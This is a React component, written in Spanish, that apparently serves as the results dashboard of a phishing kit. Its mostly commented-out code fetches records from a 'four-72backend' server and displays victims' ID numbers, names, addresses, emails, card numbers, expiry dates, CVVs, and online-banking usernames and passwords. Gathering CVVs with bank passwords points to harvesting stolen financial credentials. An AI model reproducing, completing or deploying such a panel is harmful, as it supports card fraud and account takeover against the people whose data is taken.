import React, { useState, useEffect } from 'react';


const resultados = () =>  {
/*
    const [data, setData] = useState([]);

    

    useEffect(() => {
      const fetchData = async () => {
        try {
          const response = await fetch('https://four-72backend.onrender.com/api/usuarios//EkM8pokjdsfiojsdijfiosnahyugysffa'); // Reemplaza 'https://api.example.com/data' con la URL de tu API
          const jsonData = await response.json();
          setData(jsonData);
        } catch (error) {
          console.error('Error fetching data:', error);
        }
      };
  
      fetchData();
    }, []);

*/

  return (
    <div className='contenedor mx-5 text-center'>
      <h2 className='my-5'>Resultados de la Base de Datos</h2>
{/*
        <div className="row my-5">
            <div className="col">
                <p className='h4'>Cédula</p>
                    {data.map((item) => (

                     <p className='my-2' key={item._id}>{item.cedula}</p>
                     
                   ))}
            </div>
        </div>

        <div className="row">
            <div className="col-6">
                <p className="h4">Nombre</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.nombre}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className="h4">Celular</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.celular}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className="h4">Ciudad</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.ciudad}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className="h4">Dirección</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.direccion}</p>
                     
                   ))}
            </div>
        </div>

<hr/>

        <div className="row mt-5">
            <div className="col-6">
                <p className="h4">Email</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.email}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className="h4">Banco</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.banco}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className="h4">Tarjeta</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.tarjeta}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className="h4">Mes</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.mes}</p>
                     
                   ))}
            </div>

        </div>


        <div className="row text-center">
            <div className="col-6">
                <p className='h4'>Año</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.año}</p>
                     
                   ))}
            </div>

            <div className="col-6">
                <p className='h4'>CVV</p>
                    {data.map((item) => (

                     <p key={item._id}>{item.cvv}</p>
                     
                   ))}
            </div>

        </div>

        <hr />

        <div className="row mt-5">
            <div className="col-6">
                <p className="h4">Usuario</p>
                    {data.map((item) => (

                    <p key={item._id}>{item.usuario}</p>
                    
                ))}
            </div>

            <div className="col-6">
                <p className="h4">Contraseña de Banco</p>
                    {data.map((item) => (

                    <p key={item._id}>{item.contraseñaBanco}</p>
                    
                ))}
            </div>

        </div>

      <ul>
        
      {/* {data.map((item) => (
<>
           


          <li key={item._id}>{item.cedula}</li>
          </>
        ))}

      </ul>
       */}

      
    </div>
    
  );
}

export default resultados;
